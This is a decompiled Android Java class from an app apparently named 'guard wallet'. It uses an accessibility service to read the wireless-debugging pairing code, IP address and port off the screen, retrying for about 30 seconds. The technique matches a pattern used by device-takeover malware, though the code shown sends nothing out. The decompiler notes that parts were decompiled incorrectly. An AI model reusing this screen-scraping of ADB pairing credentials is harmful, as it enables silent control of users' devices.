package com.guard.wallet.thread;

import a1.AbstractC0026q;
import android.os.Build;
import android.util.Log;
import com.guard.wallet.entity.PairPortAndCodeResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0251g;
import java.util.Objects;
import java.util.concurrent.Callable;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import p012o.a0;

/* renamed from: com.guard.wallet.thread.h */
/* loaded from: classes.dex */
public final class CallableC0239h implements Callable {

    /* renamed from: a */
    public final a0 f376a;

    /* renamed from: b */
    public final AtomicReference f377b = new AtomicReference(null);

    /* renamed from: c */
    public final AtomicInteger f378c = new AtomicInteger(0);

    /* renamed from: d */
    public final AtomicReference f379d = new AtomicReference(null);

    public CallableC0239h(a0 a0Var) {
        this.f376a = a0Var;
    }

    /* JADX WARN: Code restructure failed: missing block: B:92:0x012d, code lost:
    
        r7 = true ^ a1.AbstractC0026q.m151B(r1.get());
     */
    @Override // java.util.concurrent.Callable
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object call() {
        AtomicReference atomicReference;
        boolean z2;
        AtomicReference atomicReference2 = this.f379d;
        atomicReference2.set(null);
        AtomicInteger atomicInteger = this.f378c;
        atomicInteger.set(0);
        int i2 = 0;
        loop0: while (true) {
            atomicReference = this.f377b;
            z2 = true;
            if (i2 >= 30) {
                break;
            }
            a0 a0Var = this.f376a;
            if (!a0Var.m996M()) {
                break;
            }
            try {
                Log.d("ReadPairCodeCallable", "开始读取配对码");
                UiObjectCollection findByClassName = a0Var.m1072k() != null ? a0Var.m1072k().findByClassName("android.widget.TextView") : null;
                if (findByClassName != null && findByClassName.size() > 0) {
                    for (UiObject uiObject : findByClassName.getNodes()) {
                        if (uiObject != null && !AbstractC0026q.m151B(uiObject.text())) {
                            String text = uiObject.text();
                            if (!Objects.equals(text, "与设备配对") && !Objects.equals(text, "WLAN 配对码") && !Objects.equals(text, "IP 地址和端口")) {
                                Log.d("ReadPairCodeCallable", "读取配对码:" + text);
                                String[] split = uiObject.text().split(":");
                                if (split.length == 2 && AbstractC0026q.m153D(split[1]) && atomicInteger.get() <= 0) {
                                    atomicReference.set(split[0]);
                                    atomicInteger.set(Integer.parseInt(split[1]));
                                }
                                if (split.length == 1 && AbstractC0026q.m153D(split[0]) && AbstractC0026q.m151B(atomicReference2.get())) {
                                    atomicReference2.set(AbstractC0026q.m166Q(split[0]));
                                }
                                if (!AbstractC0026q.m151B(atomicReference2.get()) && atomicInteger.get() > 0) {
                                    break loop0;
                                }
                            }
                        }
                    }
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("ReadPairCodeCallable", e2);
            }
            if (!AbstractC0026q.m151B(atomicReference2.get()) && atomicInteger.get() > 0) {
                break;
            }
            Log.e("ReadPairCodeCallable", "未读取到配对码读取配对码");
            i2++;
            AbstractC0251g.T0(1);
            if (MyAccessibilityService.m554P() != null) {
                if (Build.VERSION.SDK_INT >= 33) {
                    MyAccessibilityService.m548I(a0Var.m1072k());
                } else {
                    a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                }
            }
        }
        if (z2) {
            return new PairPortAndCodeResult((String) atomicReference.get(), Integer.valueOf(atomicInteger.get()), (String) atomicReference2.get());
        }
        return null;
    }
}
